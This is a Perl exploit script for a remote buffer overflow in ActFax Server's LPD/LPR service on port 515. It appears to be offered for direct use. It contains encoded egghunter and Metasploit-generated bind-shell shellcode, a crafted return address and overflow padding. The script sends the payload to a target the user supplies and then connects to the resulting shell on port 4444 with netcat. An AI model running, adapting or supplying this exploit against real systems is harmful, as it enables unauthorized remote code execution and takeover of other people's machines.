print "\nActFax Server LPD/LPR Remote Buffer Overflow\n";  

print " chap0 - www.seek-truth.net \n\n";  

   

use IO::Socket;  

   

print "Target Address Please: ";  

chomp($target = <STDIN>);  

    

my $sock = IO::Socket::INET->new(PeerAddr => $target, PeerPort => '515', Proto => 'tcp');  

   

print "Connecting. . .\n";  

   

# egghunter EDI encoded  

my $eggedi="WYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIrFOqZjyo4O1RPRrJwrShXMvNuluUBzBTJOoH2Wtpp0PtLKxzlorUYzlo2UHgKOKWA";  

   

   

# ./msfpayload windows/shell_bind_tcp LPORT=4444  

# alpha2 encoded aligned with edi  

my $shellcode="WYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIKLyxniWpwpWpSPk9yuVQJr2DLKsb4pLKP".  

"RvllKPR4TnksB18VoNWaZvFvQyotqKpnLwLSQSLuRVL5p9QZo4MS1kwKRJPQB67NkrrtPlKBb5l5Qn0NkcpQhK5kpt4BjWqXPPP".  

"LKsxdXlKpX7Ps1jsjC5lg9lKdtlKS1N6uaKOvQyPllo1hOTM5QYWEhKPQel46c3M8x7KSMetpuKRpXlKshQ4GqkccVLK6lPKLK0".  

"XUL7qN3lKGtlK31jpLIpDEtUt1KSkCQPY0ZpQKOypshaO2zLKTRJKNf1MQx7CWBUPwpaxt7rSebaOSdphpLPwDfUWkOXUx8npwq".  

"uPWp7Yo4cdPPrH5ymPbKWpKOJupPrpbp2p70pPcppPaxxjvoyOKPYoYEmYO7VQkkpSphUReP4QqLoyxf1zFpPVsgcXkrIKVWPgK".  

"O8Uccv7rHMgYydx9o9oJubsrs2wbHD4Xl7Km1KOXU67OyZgU81eRN2mU1KOJuRHpcpmU4GpOykS2wv7qGdqHvsZgbV9SfIrKMqv".  

"jgW4TdWLEQUQLMstWTvpo6ePw42tpPrvqF1FG6PVrnSfV6pS2vsXqizlUoovkOHUmYkPpNRvQVIotpph7xmWwmSPKON5oKJPH5M".  

"rSfu8LfmEMmmMKOiEgL363LgzMPkKkPsEWumk0G230rporJEPPSKOHUgzA";  

   

   

my $payload1 = "A" . $eggedi . "\x7D" x (256-length($eggedi));  

my $addy = "\x7D\x4B\x4A\x00" ;# --> pop EDI/ pop ESI/ pop EBP/ pop EBX/ pop ECX/ retn  

my $payload2 = "w00tw00t" . $shellcode;  

   

my $payloads = $payload1.$addy.$payload2;  

   

print $sock $payloads;  

   

    

print "DONE shell in a moment. . .\n";  

   

$connect = "nc -vvn $target 4444";  

   

system $connect 

